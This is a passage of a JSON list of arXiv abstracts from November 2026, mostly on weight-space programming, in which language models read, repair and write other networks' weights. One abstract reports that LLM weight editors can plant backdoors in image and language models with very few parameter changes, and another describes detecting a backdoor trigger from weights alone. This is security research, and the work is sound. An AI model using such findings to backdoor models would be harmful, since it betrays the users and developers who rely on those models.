+  "abstract": "We present W-ISA, a software instruction set and transactional runtime for executing weight-space intervention programs on pretrained language models. Shape-checked instructions express parameter updates, projections, ablations, and rank-one transformations. The runtime applies these programs within request-scoped execution contexts and restores saved parameters after completion or interruption. Activation-based match-action rules connect measured model states to intervention selection. We evaluate restoration and replay on SmolLM-135M-Instruct and Qwen2.5-1.5B-Instruct, and compare materialized rank-one updates with equivalent PyTorch hooks on the latter. In 45 timed requests, both intervention implementations produce identical greedy sequences at 32, 128, and 512 tokens; their maximum prompt-logit difference is 0.000184. On the complete WikiText-2 raw test split, the combined SmolLM attention-head ablation and MLP projection changes perplexity from 22.2353 to 22.3188, a relative increase of 0.3754%. W-ISA separates intervention specification, execution, and measurement, making parameter-level experiments reproducible and composable.",
+  "src": [
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.13232"
+ },
+ {
+  "id": "2611.13236",
+  "ver": "2611.13236v1",
+  "title": "NCP: Verifier-Guided Optimization of Weight-Space Control Policies",
+  "authors": [
+   "Ekrem Aksoy"
+  ],
+  "published": "2026-11-09",
+  "cats": [
+   "cs.AI"
+  ],
+  "abstract": "We present the Neural Control Plane (NCP), a closed-loop system that observes language-model execution, synthesizes candidate weight-space intervention rules, evaluates them, and maintains a versioned table of admitted policies. NCP separates a pretrained model's inference data plane from the control policy that selects temporary parameter interventions. W-ISA supplies transactional execution and parameter restoration; NCP supplies telemetry, candidate synthesis, admission criteria, priorities, and rule lifetime management. The optimization state consists of active rules and an archive of evaluated candidates, while base-model parameters are restored after each request. In a local SmolLM-135M-Instruct experiment, NCP generated three candidates from development telemetry and evaluated them on separate task examples and a 4,095-target WikiText-2 slice. One projection reduced validation token repetition from 0.4133 to 0.2191, with a perplexity change of -0.0574%. All candidates produced zero newly correct exact answers, so the configured admission gate archived all three and retained the original active policy. Fresh-process repetition and saved-table resumption reproduced the measured outcomes. NCP provides an executable framework for studying recursive self-improvement at the control-policy level through explicit synthesis, verification, and state transitions.",
+  "src": [
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.13236"
+ },
+ {
+  "id": "2611.13758",
+  "ver": "2611.13758v1",
+  "title": "Mixed Signals: Weight-Space Programming for EEG and ECG",
+  "authors": [
+   "Dara Varam",
+   "Taraneh Aminosharieh Najafi",
+   "David Atienza"
+  ],
+  "published": "2026-11-10",
+  "cats": [
+   "cs.LG",
+   "cs.AI",
+   "eess.SP"
+  ],
+  "abstract": "Weight-space programming allows language models to read a trained neural network's weights and edit them. This opens the door to ``training'' by reasoning rather than through gradient descent. Prior work has demonstrated its functionality and promise for game-playing networks and fixing specific failures in language models, even extending to diffusion models. In this work, we present its applicability to models trained on biosignal data, specifically EEG and ECG data. We show that frontier models are not only able to debug specific faults planted in biosignal-based models without being told what these faults are, but are even capable of writing all the weights of a network from scratch, given only the architecture, the task, and a minimal set of training subjects. In particular, in one set of experiments, a language model was able to match standard gradient-descent training using $6\\times$ fewer training subjects, through reasoning alone and without any gradient descent step. Networks written by Claude Opus 5.5 also scored higher than classic hand-crafted EEG pipelines (alpha band power, and common spatial patterns with linear discriminant analysis) when built from the same 5 subjects. We also highlight some of the limitations, which include the inability of language models to improve already well-trained classification models, and their incapacity to reliably recognize, from the weights alone, the task a network was trained on. Overall, our results indicate that weight-space programming can be useful for small networks, such as those deployed on edge devices and wearables, but the concept still requires further investigation before it can be used in practice.",
+  "src": [
+   "api",
+   "awsp:\ud83e\udde9 Other Domains",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.13758"
+ },
+ {
+  "id": "2611.14210",
+  "ver": "2611.14210v1",
+  "title": "Tree-Ising: Repairing Language Models with Bit-Level Ising Edits",
+  "authors": [
+   "Hadi Salloum",
+   "Ammar Ali"
+  ],
+  "published": "2026-11-10",
+  "cats": [
+   "cs.LG"
+  ],
+  "abstract": "Weight-space programming, introduced in recent MIT work by Takehi et al., enables a frontier LLM agent to read a network's weights and write a repair. Their GPT-6 Astra agent corrected the reasoning loops of Qwen3.5-0.8B without gradients, using 158 agent turns, 89.7 million tokens, and 50 forward-pass requests. Our method, Tree-Ising, casts this repair as a sparse discrete optimization problem over the model's own BF16 weights. Forward statistics define an objective that weakens a loop direction, strengthens a concluding direction, and preserves the layer's output on productive tokens. Within a state-tree representation, where lossless BF16 storage acts as a special case, the admissible edits are sign flips and exponent shifts that preserve all shared group exponents and mantissas. We decompose this objective exactly into independent QUBO (Ising) problems, one per output row, which we solve on a GPU using simulated annealing or quantum-inspired simulated bifurcation. On the agent's two layers, Tree-Ising achieves 54.6% on MATH-500, outperforming the agent's edit (51.7%) under the same evaluation protocol, while the base model scores 7.9% as reported. The simulated bifurcation solver yields a statistically indistinguishable repair at 55.1%. Both solvers outperform the agent edit across all five math benchmarks, with statistically significant improvements on MATH-500 and GSM8K after correcting for multiple comparisons. Our approach modifies 13% to 17% fewer weights and reduces BF16 bit flips by a factor of 2.2 to 2.3. It requires only four forward-pass requests and zero LLM tokens, with the annealing recipe costing about $0.90 in GPU time. On Qwen3.5-2B, with layers and dose selected using only the base model, the same recipe increases greedy GSM8K accuracy from 21.6% to 69.4%. As a proof of concept, we execute an eight-variable repair subproblem using QAOA on an IBM Heron processor.",
+  "src": [
+   "api",
+   "awsp:\ud83d\udcac Language Models",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.14210"
+ },
+ {
+  "id": "2611.15917",
+  "ver": "2611.15917v2",
+  "title": "Owned Edits to a Shared Decision Rule: Learning Private Exceptions as Typed, Gated, Withdrawable Weight Edits",
+  "authors": [
+   "John J. O'Hare"
+  ],
+  "published": "2026-11-11",
+  "cats": [
+   "cs.LG",
+   "cs.CY"
+  ],
+  "abstract": "Organisations that apply the same published decision rule often hold private evidence that the rule is wrong for their own cases, and will not pool it. We describe a learning mechanism for that setting whose unit of change is an owned edit. The published rule is compiled exactly into a small ReLU network, a structured prior. Each party's learner searches a small typed space of declarations, a few named values such as subject, scope, form and size, and proposes one only when its own records pass a selection-aware evidence gate. The learning is that gated search around the prior. In two pre-registered analyses, on synthetic data whose 20 hidden truths were sampled from that typed space, the learner at 30 records per party was non-inferior, within 2 points, to all seven tuned baselines (a confined gradient learner, Ditto, FedRep, federated averaging, two pooled networks and pooled boosted trees), scoring 96.6% against 91.7% for the unchanged rule; a descriptive greedy ablation with no prior, over a separate space, scored 84.0%. In a third registered test, typed edits over a network trained on shared records beat that network alone by +5.4 points and the same edits over the published rule by +3.1; oracle-tuned fine-tuning and Ditto matched it at 30 records. An acceptance body recomputes each edit from its declaration and writes it into units reserved for that party, so by construction an edit changes no decision about any other subject, withdraws exactly, discloses at most log2 of the typed space's size in bits, and the artefact can hide nothing beyond its declared values; timing is not covered. We report where it loses: truths shared by all parties, relaxations, ten records, a pre-stated gate criterion that failed in both runs, and a language model given the records that decided about as accurately on one draw. On a rule-only base, a table of owned exceptions makes the same decisions.",
+  "src": [
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.15917"
+ },
+ {
+  "id": "2611.16981",
+  "ver": "2611.16981v1",
+  "title": "Compiling Known Rules into Compact Neural Agents: Weight-Space Programming on Unseen Games",
+  "authors": [
+   "Jens Lehmann"
+  ],
+  "published": "2026-11-12",
+  "cats": [
+   "cs.AI",
+   "cs.LG"
+  ],
+  "abstract": "Weight-space programming (WSP) uses language models to construct neural network weights without training. We test whether known game mechanics can be compiled into compact agents that generalise to held-out levels, renderings and start states within a game family. Writers receive simulator source with held-out level data removed for 20 privately authored, unpublished ARC-AGI-3-style game families. With a fixed 57k-parameter recurrent architecture, the strongest writer reaches 56% held-out-level success with feedback, while the four main writers' Python players reach 97-100%. An exploratory free-architecture condition reaches 68-90%. Learning from support-level examples transfers much less well, but these learners lack the source information given to writers. Written networks have a program-like structure: 93% of parameters are zero, and 90% of the rest are small integers or powers of two. NumPy players under comparable computation caps reach 91%, versus the networks' 79%. Training the strongest writer's architectures from scratch yields about 1% success within our budget. Written fixed-network weights are fragile, and standard PPO removes most of their success. Prompts for noise robustness increase tolerance by about four orders of magnitude for two of three writers, but PPO makes larger updates and still removes most success. These results demonstrate rule-to-network compilation in this setting, while showing limited benefits over Python programs and no successful combination with the tested PPO fine-tuning.",
+  "src": [
+   "api",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.16981"
+ },
+ {
+  "id": "2611.17246",
+  "ver": "2611.17246v1",
+  "title": "Programming Quantum Circuit Parameters with Large Language Models",
+  "authors": [
+   "Tiago de Souza Farias",
+   "Caio Moraes Porto",
+   "Matheus da Silva Fonseca",
+   "Nicolas Armando Cabrera Carpi",
+   "Anderson de Araujo Oliveira",
+   "Celso Jorge Villas-Boas"
+  ],
+  "published": "2026-11-12",
+  "cats": [
+   "quant-ph",
+   "cs.LG"
+  ],
+  "abstract": "Large language models (LLMs) have recently demonstrated the ability to generate parameters for variational quantum circuits without conventional optimization. However, the conditions under which this approach is effective remain unclear. Here, we investigate a frozen, general-purpose LLM that generates complete circuit parameter vectors from symbolic circuit and Hamiltonian descriptions, with optional iterative energy feedback. We evaluate the approach on general random Hamiltonians, structured parent Hamiltonians, and molecular systems. For general Hamiltonians, LLM-generated parameters exhibit larger energy errors than conventional Adam optimization, while additional feedback generally provides limited improvement. In contrast, for structured Hamiltonians, the LLM can generate promising low-energy parameter configurations, suggesting that identifiable physical and mathematical structure facilitates parameter inference. We also show that direct LLM predictions of minimum energies can violate the Hamiltonian spectral lower bound, whereas generated circuit parameters allow independent evaluation of physically realizable energy expectation values. Finally, we investigate blind circuit interpretation and find that the LLM can predict measurement outcomes even when it fails to identify the underlying quantum algorithm. These findings highlight the role of problem structure, the limitations of iterative LLM optimization, and the importance of independently verifiable predictions in quantum parameter programming.",
+  "src": [
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.17246"
+ },
+ {
+  "id": "2611.17395",
+  "ver": "2611.17395v1",
+  "title": "Can LLMs Write Backdoors? An Empirical Security Study of Weight-Space Programming",
+  "authors": [
+   "Zhaojia Wang",
+   "Jiucui Lu",
+   "Zheng Li"
+  ],
+  "published": "2026-11-12",
+  "cats": [
+   "cs.CR",
+   "cs.AI",
+   "cs.LG"
+  ],
+  "abstract": "Recent advances in weight-space programming (WSP) have demonstrated that large language models (LLMs) can directly inspect and modify neural network weights without conventional gradient-based training. While this capability opens new possibilities for model improvement, it also raises an important security question: Can LLMs exploit weight-space programming to inject backdoors into neural networks? To answer this question, we present an empirical security study of LLM-driven weight-space programming for backdoor injection. Specifically, we investigate whether general-purpose LLMs can directly modify the weights of target models according to natural-language instructions, without accessing task-specific data, performing forward passes, or computing gradients. We evaluate five LLMs as weight editors across three target architectures: an MLP on MNIST, ResNet-18 on CIFAR-10, and Qwen2.5-0.5B-Instruct on AG News. Our experiments reveal three key findings. First, LLM-driven weight editing can successfully inject backdoors across different architectures while largely preserving clean performance. Second, successful attacks can require remarkably few parameter modifications, including only six parameters for the MLP and 0.02% of the weights for a fine-tuned Qwen model. Third, editing capabilities vary substantially across LLMs and target architectures: although all five LLMs successfully backdoor the MLP, only GPT-6 Astra succeeds across all three targets. These findings highlight an emerging security risk of weight-space programming and underscore the importance of safeguarding LLM-driven weight editing.",
+  "src": [
+   "api",
+   "awsp:\ud83d\udd0d Analyses and Critiques",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.17395"
+ },
+ {
+  "id": "2611.17789",
+  "ver": "2611.17789v1",
+  "title": "Can Large Language Models Optimize Pretrained Neural Network Weights? A Multi-Phase Empirical Evaluation of Gradient-Free Editing in YOLO26 Object Detection",
+  "authors": [
+   "Mohamed Abdallah Salem"
+  ],
+  "published": "2026-11-13",
+  "cats": [
+   "cs.CV",
+   "cs.AI"
+  ],
+  "abstract": "Direct weight editing offers a gradient-free alternative to fine-tuning pretrained detectors, but its generalization and the value of large language model (LLM) guidance remain uncertain. We evaluate five experimental phases using YOLO26 models and MS COCO, comparing deterministic scaling, random perturbations, differential evolution, CMA-ES, structured interventions, real local-LLM proposals, failure-aware guidance, and hybrid LLM-CMA-ES against a matched random-policy control. Optimization uses native Ultralytics mAP50-95 on 1,000 COCO Val2017 images; selected candidates are assessed on a disjoint, previously examined 1,500-image subset, with COCO API AP50-95 reported separately where available. Increasing the CMA-ES budget from 8 to 250 evaluations raised development gains from +0.11 to +0.28 percentage points, while selection changes remained negative (-0.03 to -0.12 points); the 250-evaluation result uses one seed. The hybrid LLM approach showed no statistically established advantage over random-policy guidance (p = 0.612, 0.369, and 0.694 at budgets 8, 25, and 50). Five-seed YOLO26m replication yielded a COCO API AP difference of +0.004 points (95% CI: -0.026 to +0.034). Of 225 archived LLM proposals, 53 satisfy the final strict schema; early tensor-level execution cannot be fully verified. Genuine LLM-mediated weight editing is feasible, but the tested approaches did not demonstrate consistent transfer beyond the development subset or a measurable LLM advantage.",
+  "src": [
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.17789"
+ },
+ {
+  "id": "2611.18114",
+  "ver": "2611.18114v1",
+  "title": "Interpretable weight-space programming builds transparent transformers and brain encoding models",
+  "authors": [
+   "Yash Mehta",
+   "Chandan Singh",
+   "Weijia Xu",
+   "Richard J. Antonello",
+   "Adeen Flinker",
+   "Nima Mesgarani",
+   "Michael F. Bonner",
+   "Nebojsa Jojic",
+   "Jianfeng Gao"
+  ],
+  "published": "2026-11-13",
+  "cats": [
+   "cs.CE",
+   "cs.AI"
+  ],
+  "abstract": "Neural networks are powerful predictors, yet their opacity limits their usefulness in science, where the goal is explanation rather than mere prediction. In neuroscience, for example, deep encoding models accurately predict brain activity in response to natural stimuli, but struggle to reveal which stimulus features drive those predictions. Here we introduce interpretable weight-space programming (iWSP), a method in which an LLM agent iteratively builds interpretable models by explicitly programming their weights and features in code, without gradient-based training (backpropagation). Without backpropagation to tune parameters, the agent must draw on its prior knowledge and reason over previous trials to hypothesize, hand-craft, and refine human-interpretable computations mirroring the workflow of a human scientist. LLM audits confirm the interpretability of the hand-crafted models. We first validate iWSP by tasking it with constructing transformers for canonical benchmarks such as arithmetic and sentiment classification, finding that LLM agents can successfully craft compact, accurate networks directly. Next, we apply iWSP to build neural encoding models across vision, language, and audition. In the visual cortex, iWSP outpredicts existing interpretable baselines, uncovers distinct computations across early/higher visual areas, and generalizes to unseen data. In language fMRI, iWSP surfaces a confound in the data and in auditory ECoG, it systematically discovers interpretable acoustic features that predict neural activity. Together, these results establish iWSP as a general paradigm for aligning high predictive performance with human-interpretable scientific discovery.",
+  "src": [
+   "api",
+   "awsp:\ud83d\udcac Language Models",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.18114"
+ },
+ {
+  "id": "2611.18538",
+  "ver": "2611.18538v1",
+  "title": "Why Finite Intelligence Works in an Infinite World: A Mathematical Theory",
+  "authors": [
+   "Mojtaba Soltanalian"
+  ],
+  "published": "2026-11-13",
+  "cats": [
+   "cs.IT",
+   "cs.LG",
+   "stat.ML"
+  ],
+  "abstract": "An information system often has to learn before it knows what it will be asked. A finite representation can succeed without recording an infinite environment in full when those asks share collective structure, rather than demand unrelated facts scattered arbitrarily across it. We formalize this phenomenon through future-task information, the minimum retained information needed to preserve decision value relative to the available evidence. A joint decision-regret state records posterior comparisons among actions for every permitted task. Under compactness assumptions, every retained representation admits a calibrated replacement based on this state, preserving all task regrets without increasing information; the resulting information-regret curve equals an operational coding rate. Two exact boundaries govern finite preservation: weak-star closure for a fixed action count, and the singular mass of the source-evidence law when all finite action menus are admitted. Collective structure determines information requirements beyond individual-question difficulty. Families with identical source laws, pairwise task metrics, and individual-task rates can have different high-resolution exponents. Covariance-identical coordinate and parity families have different exact rate-distortion curves, with optimal parity retention characterized by a sharp Fourier-entropy inequality. For balanced nested task families, refinement sizes and weighted reach determine the rate within an additive constant, attained by prefix coding under explicit decay conditions. Nonlinear learning and computational separations distinguish preservation from efficient discovery and use. The proposed mathematical theory identifies which shared decision requirements allow finite information to remain useful for infinitely many possible purposes.",
+  "src": [
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.18538"
+ },
+ {
+  "id": "2611.18553",
+  "ver": "2611.18553v1",
+  "title": "WeightBench: Evaluating Language Models as Weight-Space Programmers",
+  "authors": [
+   "Aayush Marasini",
+   "Barsat Khadka",
+   "Nick Rahimi"
+  ],
+  "published": "2026-11-13",
+  "cats": [
+   "cs.LG",
+   "cs.AI"
+  ],
+  "abstract": "Recent work shows that large language models (LLMs) can operate directly on the parameters of other neural networks. They can read what a network was trained to do, fix a network that fails, and write working networks from scratch, all without gradient descent. This capability has been termed Weight-Space Programming (WSP). Exploring this new paradigm systematically requires a robust benchmark. We introduce WEIGHTBENCH, a benchmark that evaluates LLMs of increasing capability on 42 WSP tasks across five tracks: reading, fixing and writing weights, recognizing edits that are impossible, and data-free compression. The networks whose weights the LLMs read and edit range from 2K-parameter control policies to 7B-parameter language models. Experimental benchmark results show that frontier agents can already read small networks and write working control policies without ever running them, but cannot yet patch language models, compress them without data, or tell an impossible edit from a hard one. On all 42 tasks, Claude Opus 5.5 reaches a macro score of 0.535 (Sonnet 5.5 0.466, Haiku 5.5 0.402, DeepSeek v4-flash 0.215); on the 38 tasks it was run on, GPT-6.1-sol reaches 0.568 against Opus's 0.546. Code, the task registry, our OS-level sandbox harness, and the live leaderboard are publicly available at https://github.com/Aayush-Marasini/WeightBench.",
+  "src": [
+   "api",
+   "awsp:\ud83d\udcca Benchmarks and Evaluati",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.18553"
+ },
+ {
+  "id": "2611.18690",
+  "ver": "2611.18690v2",
+  "title": "Perceptual Weight Space Programming for Diffusion Super-Resolution",
+  "authors": [
+   "Chenzhi Zheng",
+   "Zhuoran Zheng"
+  ],
+  "published": "2026-11-03",
+  "cats": [
+   "cs.CV",
+   "cs.AI"
+  ],
+  "abstract": "Diffusion models for image super-resolution can recover scene content while producing distracting artifacts or unbalanced colors. We study whether a large language model (LLM) can improve perceptual quality by editing a small subset of existing U-Net weights without a clean reference image. The proposed framework provides the editor with architecture code, selected weights, activation summaries, and sampling previews. It permits up to 1,020 candidate trials while limiting accepted changes to three layers and fewer than 0.1\\% of model parameters. The evaluation protocol uses ResShift, SinSR, and SUPIR and compares GPT-6 Astra with a specified Qwen3-VL model under matched access. Feedback metrics guide editing, while separate quality metrics and blinded human comparisons evaluate the final weights. We also report an executed color calibration experiment using real photographs and two small residual networks. This experiment demonstrates correction of a fixed color shift and reveals that an improving feedback score can accompany worse performance on unseen scenes. A separate lightweight super-resolution experiment isolates modest changes in luminance detail while preserving color. The findings motivate restricted updates and independent evaluation of perceptual weight editing.",
+  "src": [
+   "api",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.18690"
+ },
+ {
+  "id": "2611.18919",
+  "ver": "2611.18919v1",
+  "title": "Correcting Persistent Failures in Point-Cloud Grasping Policies using Human Demonstrations in Virtual Reality",
+  "authors": [
+   "Achyuthan Unni Krishnan",
+   "Karthik Rengarajan",
+   "Bharath Narasimhan",
+   "Chris von Csefalvay"
+  ],
+  "published": "2026-11-13",
+  "cats": [
+   "cs.RO"
+  ],
+  "abstract": "Robots in homes, warehouses and farms must pick up objects they have never seen, usually without a 3D model or a category label. A grasping policy that works directly on the point cloud from a depth sensor needs only the geometry the robot observes, so it applies to any new object. Offline grasp generators such as Contact-GraspNet work this way, but they rank grasps by learned plausibility rather than by whether the grasp actually lifts the object. Reinforcement learning (RL) can optimize for that directly and make a point-cloud grasping policy much better on average, yet it leaves specific grasps persistently unsolved. We present a human-in-the-loop failure loop that targets those grasps: situations an RL policy keeps failing are mined automatically, sent to a virtual-reality application where a person picks the object up with their own hands, and returned to training as two grasp points. The person contributes only where to grasp; the robot chooses its own approach. In simulation, RL raises success on unseen objects from 55% with Contact-GraspNet to 83%. Adding 58 human demonstrations nearly doubles success on the hard cases RL kept failing, from 24% to 45%, and recovers performance that RL alone loses on similar cases that were never demonstrated, without reducing success on unseen objects.",
+  "src": [
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.18919"
+ },
+ {
+  "id": "2611.19292",
+  "ver": "2611.19292v3",
+  "title": "Zero-Shot Weight-Space Programming for Prediction and Classification of Target Variables in Structured Datasets",
+  "authors": [
+   "Eduardo C. Garrido-Merch\u00e1n"
+  ],
+  "published": "2026-11-14",
+  "cats": [
+   "cs.AI"
+  ],
+  "abstract": "Weight-space programming fixes every parameter of a feed-forward network by hand, with no gradient descent anywhere in the construction. Every demonstration so far starts from a target function handed to the model as a rule system, making it a compilation problem. A supervised dataset withholds that specification, so the procedure must do the statistical inference itself and then express the result in the parameterisation it was given. We ask whether a large language model can do both. It is shown a small dataset in full, with the architecture of a feed-forward network, and writes out every weight and bias as a literal number, with no optimizer, no gradient, no code execution, and no chance to evaluate it first. Each construction is sealed and pre-registers its expected score. The graded suite runs from two toy problems, through nine synthetic problems disguised by a hidden rotation, to the classical benchmarks and one real engineering regression. The frozen network matches the closed-form optimum wherever that optimum is linear, reaches the irreducible error of the generating process on three rungs where it is not, and beats every fitted baseline on two of those, including the same architecture trained by gradient descent. It fails on two rungs, both times because the structure to be found is oblique to the coordinates it analysed. Three further constructors separate two failure modes a single score conflates: one returns no parameter vector at all on the hardest rungs, another delivers everywhere while writing networks worse than predicting the mean. One of those failures proves avoidable: another constructor solves the oblique-hinge rung by a margin that survives multiple-comparison correction. What predicts whether the hidden layer earns its keep is the training error of a linear separator, which the composite complexity index misses.",
+  "src": [
+   "api",
+   "awsp:\ud83d\udcac Language Models",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.19292"
+ },
+ {
+  "id": "2611.19304",
+  "ver": "2611.19304v1",
+  "title": "A Backdoor Trigger Is Legible in Fine-Tune Weights",
+  "authors": [
+   "Snigdha Chandan Khilar"
+  ],
+  "published": "2026-11-14",
+  "cats": [
+   "cs.LG"
+  ],
+  "abstract": "A backdoored language model behaves normally until a trigger phrase appears in its input. Every published method for recovering such a trigger runs the model. We show the trigger is legible in the weights alone: a static statistic reads a fine-tuned checkpoint with no forward pass of the suspect, no data, no labelled population of poisoned models and no prior knowledge that a backdoor exists, and names one of the tokens of the trigger phrase as the single highest-ranked candidate in the vocabulary.",
+  "src": [
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.19304"
+ },
+ {
+  "id": "2611.20174",
+  "ver": "2611.20174v1",
+  "title": "Weights & Caches: LLMs Can Program Tabular Foundation Models",
+  "authors": [
+   "Shi Bin Hoo",
+   "Magnus Buehler",
+   "Omar Swelam",
+   "Frank Hutter",
+   "Lennart Purucker"
+  ],
+  "published": "2026-11-15",
+  "cats": [
+   "cs.LG"
+  ],
+  "abstract": "Neural networks are typically programmed through optimization, rather than by explicitly specifying their computations. Recent work on weight-space programming suggests that large language models (LLMs) can instead reason about and manipulate neural-network weights directly. In this work, we show that LLMs can directly program statistical computations in tabular foundation models (TFMs), whose parameters enable inference across different datasets. We investigate three complementary settings using GPT-6 Astra, without gradient-based optimization. First, Astra directly programs nanoTabPFN from zero-initialized weights, achieving a mean ROC AUC of 0.849 across 20 TabArena datasets, compared to 0.876 for a pretrained baseline. Second, Astra diagnoses and repairs a signed-product regression failure in pretrained TabPFN-3.5, restoring near-perfect predictions on held-out synthetic datasets while preserving performance on TabArena-Lite, with only a 0.08% average relative increase in error. Third, it writes KV-cache-editing programs that steer TabPFN-3.5's predictions on unseen synthetic datasets, demonstrating transformations such as reversing linear trends and converting sine waves into approximate square waves, without modifying model weights. Together, our findings suggest that LLM-driven programming could complement gradient-based optimization across TFMs' development and usage, while offering a new way to investigate and intervene in their internal computations.",
+  "src": [
+   "api",
+   "awsp:\ud83e\udde9 Other Domains",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.20174"
+ },
+ {
+  "id": "2611.20566",
+  "ver": "2611.20566v1",
+  "title": "Weight-Space Programming Changes How an LLM Uses Python for Computational Biology",
+  "authors": [
+   "Makoto Sato"
+  ],
+  "published": "2026-11-16",
+  "cats": [
+   "cs.CL",
+   "cs.AI",
+   "q-bio.QM"
+  ],
+  "abstract": "Weight-space programming allows a language model to edit another model's weights without gradient-based training. We used Claude Opus 5.5 to edit Qwen3.5-0.8B and investigated how the edits changed its use of Python on computational biology problems. We compared four initial edited checkpoints with the original model on 50 test problems across three test seeds, yielding 600 paired evaluations. Strictly correct answers increased from 44 to 77, and technically correct answers, which included correct final values rejected for formatting, increased from 64 to 100. Repeated Python calls decreased from 1,834 to 1,044. Among the 64 pairs in which only the edited response was technically correct, the original model had already computed the correct value in 36 but did not submit a technically correct final answer. The edited model corrected the computation in 13 of the 64 pairs. With six additional checkpoints on the same 50 problems, technically correct answers rose from 96 to 154 across 900 pairs. We explored three selected problems with ten test seeds for each of ten checkpoints. On the melting-temperature problem, correct Python outputs decreased from 60 to 22 while technically correct final answers increased from 0 to 18. Weight editing changed both the calculations Qwen ran and whether it submitted a correct answer.",
+  "src": [
+   "api",
+   "awsp:\ud83d\udcac Language Models",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.20566"
+ },
+ {
+  "id": "2611.20953",
+  "ver": "2611.20953v1",
+  "title": "Same Fix, Different Weights: Replicating Weight-Space Programming with Claude",
+  "authors": [
+   "Subham Kundu"
+  ],
+  "published": "2026-11-16",
+  "cats": [
+   "cs.LG"
+  ],
+  "abstract": "Takehi et al. (2026) report that GPT-6 Astra, given the weights of small neural networks as text, can say what they were trained to do, repair them, and write new ones without training. I re-ran the core of that study with Claude Opus 5.5 in ten pre-registered experiments, with untrained-network and permutation controls and hand audits of every sandboxed code cell. Reading was mixed: Claude named 3 of 4 Atari games from policy weights and found the measured copying heads in 15/15 character-LM runs, but its answers about training data often followed priors. Unlike the original, it identified a sycophantic Gemma 3 270M finetune from weights alone in 6/6 runs. One-shot weight edits took a failing MountainCar policy from 0% to 100% success and a hovering LunarLander policy from 0% to 85.6%; zero-shot networks beat PPO at 100k steps on 4 of 5 environments, each implementing a textbook controller. With no training or forward passes, Claude wrote a 1.48M-parameter 9x9 Go network that won 85-94% of games against three PPO opponents. Given Qwen3.5-0.8B's weights and 10, 25 or 50 forward passes of 64 practice problems, Claude raised MATH-500 from 6.7% to 51.4%, 55.2% and 58.1% (+51.4 points at 50 passes, 95% CI [47.9, 55.0]; original 48.1%), GSM8K from 11.6% to 68.2% and IFEval from 22.2% to 54.2%. Unlike the original, which removed an internal loop direction, every edit acted at the output: it scaled the final norm, raising the effective sampling temperature, and lowered the logit of \"Wait\" while raising that of </think>. The norm scaling alone reaches only 20.9-22.1% on MATH-500. On Gemma 3 270M, which rarely loops, no edit helped (-0.8 points), as in the original.",
+  "src": [
+   "api",
+   "awsp:\ud83d\udd0d Analyses and Critiques",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.20953"
+ },
+ {
+  "id": "2611.21310",
+  "ver": "2611.21310v1",
+  "title": "Can AI Mature a Model's Geometry? Training-Free Weight Baking in LLMs",
+  "authors": [
+   "Amin Golnari",
+   "Saeid Sanei"
+  ],
+  "published": "2026-11-16",
+  "cats": [
+   "cs.LG",
+   "cs.AI"
+  ],
+  "abstract": "Can an AI make a trained language model more mature, in the sense of a better organized latent space, by looking only at the geometry of that space? An analyst model reads a fixed-size digest of topological descriptors of the layers of a frozen target and proposes a transformation, which closed-form ridge regression writes into the feed-forward weights without gradient training. Using lightweight models, 126 runs show that category purity rose on unseen words and sentences, benchmark accuracy stayed within sampling error, and the analyst matched a category-aware heuristic with gentler edits. In a five-model round robin approach, 16 pairs raised purity and four left the target unchanged. The results provide a baseline for future work on LLM-guided, training-free model editing without using raw weights.",
+  "src": [
+   "awsp:\ud83d\udcac Language Models",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.21310"
+ },
+ {
+  "id": "2611.21432",
+  "ver": "2611.21432v1",
+  "title": "Just sort it! A note on the LP behind rank-one anti-loop edits",
+  "authors": [
+   "Matteo Fischetti"
+  ],
+  "published": "2026-11-16",
+  "cats": [
+   "cs.LG",
+   "cs.CL",
+   "math.OC"
+  ],
+  "abstract": "Weight-space programming removes the thinking loops of a small reasoning model by a rank-one edit W' = W + u v^T of an MLP output matrix, where u is a loop direction and v is the solution of a sparse Linear Program (LP) over the neuron activations. We investigate whether the LP is needed. We replace it by a sort: we take the 8 neurons whose activation has the smallest coefficient of variation, and give them equal shares of the push that the LP solution realizes. On Qwen3.5-0.8B the sorted edit scores 67.0% on 1000 problems (MATH-500 and GSM8K) against 67.4% for the LP edit and 9.5% for the unedited model; the paired difference is -0.4 points, with 95% confidence interval [-2.9, +2.1], inside a non-inferiority margin of 5 points declared before the runs. On three further sampling seeds the difference is -0.6 points, interval [-2.0, +0.8], and -0.8 points, interval [-2.3, +0.6], when the dose is set without the LP. The sort does not solve the LP, but the neurons it shares with the LP solution carry most of its mean push. The outcome is that, on this model, the edit acts as a nearly constant bias along u.",
+  "src": [
+   "api",
+   "awsp:\ud83d\udd0d Analyses and Critiques",
+   "turk"
+  ],
+  "url": "https://arxiv.org/abs/2611.21432"
+ },
+ {
+  "id": "2611.21449",
+  "ver": "2611.21449v1",
+  "title": "Replicating and Extending Weight-Space Programming: Frontier LLMs Compile Programs into Weights and Read Input Layers",
+  "authors": [
+   "Roksana Goworek",
+   "Alexander Hickey",
+   "Federico Nanni",
+   "Martin O'Reilly"
+  ],
+  "published": "2026-11-16",
+  "cats": [
+   "cs.CL",
+   "cs.AI"
+  ],
